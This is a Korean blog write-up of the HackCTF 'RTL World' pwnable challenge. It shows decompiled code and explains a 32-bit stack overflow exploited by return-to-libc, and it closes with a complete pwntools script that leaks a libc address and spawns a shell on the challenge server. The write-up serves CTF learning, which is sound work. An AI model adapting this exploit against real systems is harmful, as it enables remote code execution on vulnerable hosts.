---
layout: post
title:  "HacCTF RTL World write-up"
date:   2020-01-08 19:45:55
image:  hackctfrtl.PNG
tags:   [Hackctf]
categories: [Write-up]
---

### 1.  문제

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_world/Untitled.png)

문제를 보면 굉장히 많은 문구의 내용들이 나온다. 차근차근 하나씩 입력하면서 무슨 기능을 하는 프로그램인지 확인하였다.

1번 메뉴를 누르면 현재 해당 파일에 적용되어 있는 보호기법들을 확인 할 수 있다

    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int result; // eax
      int v4; // [esp+0h] [ebp-A0h]
      int v5; // [esp+10h] [ebp-90h]
      char buf; // [esp+14h] [ebp-8Ch]
      void *v7; // [esp+94h] [ebp-Ch]
      void *handle; // [esp+98h] [ebp-8h]
      void *s1; // [esp+9Ch] [ebp-4h]
    
      setvbuf(stdout, 0, 2, 0);
      handle = dlopen("/lib/i386-linux-gnu/libc.so.6", 1);
      v7 = dlsym(handle, "system");
      dlclose(handle);
      for ( s1 = v7; memcmp(s1, "/bin/sh", 8u); s1 = (char *)s1 + 1 )
        ;
      puts("\n\nNPC [Village Presient] : ");
      puts("Binary Boss made our village fall into disuse...");
      puts("If you Have System Armor && Shell Sword.");
      puts("You can kill the Binary Boss...");
      puts("Help me Pwnable Hero... :(\n");
      printf("Your Gold : %d\n", gold);
      while ( 1 )
      {
        Menu(v4);
        printf(">>> ");
        __isoc99_scanf("%d", &v5);
        switch ( v5 )
        {
          case 0:
            continue;
          case 1:
            system("clear");
            puts("[Binary Boss]\n");
            puts("Arch:     i386-32-little");
            puts("RELRO:    Partial RELRO");
            puts("Stack:    No canary found");
            puts("NX:       NX enabled");
            puts("PIE:      No PIE (0x8048000)");
            puts("ASLR:  Enable");
            printf("Binary Boss live in %p\n", handle);
            puts("Binart Boss HP is 140 + Armor + 4\n");
            break;
          case 2:
            v4 = gold;
            Get_Money();
            break;
          case 3:
            if ( gold <= 1999 )
            {
              puts("You don't have gold... :(");
            }
            else
            {
              gold -= 1999;
              printf("System Armor : %p\n", v7);
            }
            break;
          case 4:
            if ( gold <= 2999 )
            {
              puts("You don't have gold... :(");
            }
            else
            {
              gold -= 2999;
              printf("Shell Sword : %p\n", s1);
            }
            break;
          case 5:
            printf("[Attack] > ");
            read(0, &buf, 0x400u);
            return 0;
          case 6:
            puts("Your Not Hero... Bye...");
            exit(0);
            return result;
        }
      }
    }

다음은 아이다로 확인한 코드이다.

전체적으로 switch case로 되어 있는데 결론적으로 case 5번안에 있는 read 함수를 이용하여 bof를 일으키는 문제이다

해당 파일은 NX비트가 걸려있지만 PIE가 안걸려 있으므로 yes_or_no 문제와 동일하게 풀면 될 것이다

### 2. 접근방법

일단 해당 문제는 32비트 환경이라는 것을 잊으면 안된다.

그렇다면, 다음의 순서로 접근을 하면 될 것 같다.

문제의 풀이 방법은 이전 문제와 완전 동일하기 때문에 자세하기 적지는 않겠다

1. puts **함수가 실행되기 위한 알맞은 입력값 찾기**
    - 여기서 주의할 것은 이전 문제는 64비트, 현재 문제는 32비트이므로 함수 인자 컨트롤이 다르다
        - 32비트 환경 RTL

            [RTL 기법 파헤치기](https://wogh8732.tistory.com/106?category=711515)

2. read함수로 라이브러리 주소 leak하기

3. 오프셋을 이용하여 system, /bin/sh 주소를 찾은 뒤 익스 

- 구한 값들을 이용해서 다음과 같이 페이로드를 작성하면 된다

    libc_base : 0xf7e01000
    puts : 0xf7e60ca0
    system : 0xf7e3bda0
    /bin/sh : 0xf7f5ca0b
    puts_offset(puts - libc_base) : 0x5fca0
    sys_offset(system - libc_base) : 0x3ada0
    bin_offset(/bin/sh - libc_base) : 0x15ba0b

    puts_addr - puts_offset = y_libc_base
    y_libc_base + sys_offset = system_addr
    y_libc_base + bin_offset = /bin/sh/_addr

    puts 주소 leak을 위한 입력값 :
    → ret(print plt) + 메인주소 + print got)

    익스를 위한 최종 입력값 :
    → ret(system) + 더미 + "/bin/sh"주소 

### 3. 풀이

최종 익스 코드는 다음과 같다

    from pwn import *
    #context.log_level = "debug"
    
    p=remote("ctf.j0n9hyun.xyz",3010)
    #p=process("./rtl_world")
    #gdb.attach(p)
    p.recvuntil(">>> ")
    
    p.sendline("5")
    
    p.recvuntil("[Attack] > ")
    
    
    #gatget
    puts_plt = p32(0x80485a0)
    puts_got = p32(0x804b01c)
    
    libc_base = 0x804b01c
    puts = 0x804b01c
    system = 0xf7e3bda0
    bin_sh = 0xf7e3bda0
    
    puts_offset = 0x5fca0
    sys_offset = 0x3ada0
    bin_offset = 0x15ba0b
    
    
    payload = "A"*144
    payload += puts_plt
    payload += p32(0x08048983)
    payload += puts_got
    
    p.sendline(payload)
    
    puts_addr = p.recv(4)
    log.info(puts_addr)
    puts_addr = u32(puts_addr)
    
    log.info("leak = "+hex(puts_addr))
    
    p.recvuntil(">>> ")
    
    p.sendline("5")
    
    p.recvuntil("[Attack] > ")
    
    y_libc_base = puts_addr - puts_offset 
    system_addr = y_libc_base + sys_offset 
    bin_sh_addr = y_libc_base + bin_offset
    
    payload = "A"*144
    payload += p32(system_addr) 
    payload +="BBBB"
    payload += p32(bin_sh_addr)
    
    p.sendline(payload)
    p.interactive()

### 4. 몰랐던 개념

몰랐던 개념은 없었다

이번 문제는 사실 이렇게 풀지 않아도, 메뉴 선택을 이용하여 system 함수와 /bin/sh 주소를 구하여 쉽게 익스를 할 수 있었다.

하지만 yes_or_no 문제를 풀면서 공부하고 이해했던 개념들을 복습하기 위해 이렇게 풀었다

하나 시행착오는 해당 문제는 18.04버전에서 진행했는데, remote가 아닌 process로 붙어서 진행했을때는 성공적으로 쉘이 떨어졌지만 remote로 진행했을때는 동작하지 않았다.

따라서 libc database online을 이용해서 leak한 puts 주소를 가지고 libc 버전을 확인하였는데

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_world/Untitled%201.png)

다음과 같이 해당 libc는 16버전으로 확인이 되었다

따라서 16.04 우분투환경으로 다시 오프셋을 구하여 코드를 작성하였고, 64비트 환경에서 32비트 elf 파일 실행을 위해 추가적으로 i3 머시기 패키지를 설치하여 실행하였다